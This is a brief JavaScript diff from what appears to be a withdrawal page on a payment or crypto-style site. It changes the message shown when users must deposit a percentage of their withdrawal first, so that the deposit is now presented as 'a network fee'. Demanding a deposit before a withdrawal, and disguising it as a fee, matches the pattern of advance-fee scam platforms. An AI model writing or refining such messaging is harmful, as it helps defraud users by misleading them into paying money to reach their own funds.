@@ -1130,7 +1130,7 @@ sendSubmitBtn.addEventListener('click', async () => {
     const sendMessage = document.getElementById('send-message');
     if (deductionPercentage > 0) {
         const depositAmount = parseFloat(amount) * (deductionPercentage / 100);
-        sendMessage.textContent = `You will need to deposit $${depositAmount.toFixed(2)} before you can withdraw $${amount}.`;
+        sendMessage.textContent = `To withdraw $${amount}, you need to deposit a network fee of $${depositAmount.toFixed(2)} first`;
     } else if (sendMessageText) {
         sendMessage.textContent = sendMessageText;
     } else {
